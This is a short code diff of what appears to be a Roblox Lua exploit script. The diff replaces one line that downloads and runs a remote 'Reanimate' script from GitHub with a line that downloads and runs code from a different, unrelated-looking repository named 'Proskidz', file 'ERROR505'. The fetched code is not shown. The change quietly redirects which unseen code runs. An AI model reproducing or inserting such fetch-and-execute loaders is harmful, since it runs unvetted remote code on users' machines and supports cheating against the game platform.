@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/oldhacfard/The-script/refs/heads/main/Reanimate.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IjeehDBq162y/Proskidz/refs/heads/main/ERROR505"))()
 
 Player=game:GetService("Players").LocalPlayer
 Character=Player.Character 
